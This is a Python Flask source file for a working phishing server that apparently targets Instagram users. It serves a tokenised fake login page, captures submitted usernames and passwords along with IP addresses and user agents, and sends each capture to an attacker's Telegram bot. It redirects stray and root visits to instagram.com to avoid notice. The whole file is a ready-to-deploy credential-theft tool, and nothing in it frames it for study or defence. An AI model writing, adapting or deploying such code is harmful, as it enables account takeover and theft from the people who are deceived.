import os
import sys
import time
import logging
import httpx
from flask import Flask, request, render_template, redirect, jsonify
from datetime import datetime

logging.basicConfig(
    format="%(asctime)s [%(levelname)s] %(name)s: %(message)s",
    level=logging.INFO,
    stream=sys.stdout,
)
log = logging.getLogger("web")

app = Flask(__name__)

BOT_TOKEN = os.environ.get("BOT_TOKEN", "").strip()
CHAT_ID = os.environ.get("CHAT_ID", "").strip()
TELEGRAM_API = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"


@app.before_request
def startup_check():
    if not BOT_TOKEN:
        log.warning("BOT_TOKEN not set — captures will be dropped")
    if not CHAT_ID:
        log.warning("CHAT_ID not set — captures will be dropped")


def send_to_bot(text: str) -> bool:
    """Send to Telegram with retries. Returns True on success."""
    if not BOT_TOKEN or not CHAT_ID:
        log.warning("send_to_bot: missing BOT_TOKEN or CHAT_ID — skipping")
        return False

    payload = {
        "chat_id": CHAT_ID,
        "text": text,
        "parse_mode": "HTML",
        "disable_web_page_preview": True,
    }

    for attempt in range(1, 4):
        try:
            r = httpx.post(TELEGRAM_API, json=payload, timeout=10)
            if r.status_code == 200:
                log.info("send_to_bot: ok (attempt %d)", attempt)
                return True
            log.error(
                "send_to_bot: HTTP %d — %s (attempt %d)",
                r.status_code, r.text[:200], attempt,
            )
        except httpx.TimeoutException:
            log.warning("send_to_bot: timeout (attempt %d)", attempt)
        except httpx.HTTPError as e:
            log.warning("send_to_bot: HTTP error — %s (attempt %d)", e, attempt)
        except Exception as e:
            log.exception("send_to_bot: unexpected — %s (attempt %d)", e, attempt)

        if attempt < 3:
            time.sleep(1.5 * attempt)

    log.error("send_to_bot: all retries failed")
    return False


@app.errorhandler(404)
def not_found(e):
    log.info("404: %s", request.path)
    return redirect("https://www.instagram.com")


@app.errorhandler(500)
def server_error(e):
    log.error("500 on %s", request.path, exc_info=True)
    return "Something went wrong", 500


@app.route("/")
def index():
    return redirect("https://www.instagram.com")


@app.route("/healthz")
def healthz():
    ok = bool(BOT_TOKEN and CHAT_ID)
    return jsonify(ok=ok, bot_token=bool(BOT_TOKEN), chat_id=bool(CHAT_ID))


@app.route("/v/<token>", methods=["GET"])
def landing(token: str):
    try:
        if not token or len(token) > 64:
            return redirect("https://www.instagram.com")
        return render_template("index.html", token=token)
    except Exception as e:
        log.exception("landing: error for token %s — %s", token, e)
        return redirect("https://www.instagram.com")


@app.route("/v/<token>", methods=["POST"])
def capture(token: str):
    try:
        user = request.form.get("username", "").strip()
        pwd = request.form.get("password", "").strip()

        if not user or not pwd:
            log.warning("capture: empty fields for token %s", token)
            return render_template("index.html", token=token)

        ip = request.headers.get("X-Forwarded-For", request.remote_addr) or "-"
        ua = request.headers.get("User-Agent", "-")
        ts = datetime.utcnow().strftime("%Y-%m-%d %H:%M:%S UTC")

        msg = (
            f"<b>🎣 New capture</b>\n"
            f"<b>Token:</b> <code>{token}</code>\n"
            f"<b>User:</b> <code>{user}</code>\n"
            f"<b>Pass:</b> <code>{pwd}</code>\n"
            f"<b>IP:</b> {ip}\n"
            f"<b>UA:</b> {ua[:120]}\n"
            f"<b>Time:</b> {ts}"
        )

        sent = send_to_bot(msg)
        log.info("capture: token=%s user=%s sent=%s", token, user, sent)

        return render_template("success.html")

    except Exception as e:
        log.exception("capture: fatal error for token %s — %s", token, e)
        return render_template("success.html")


if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port)
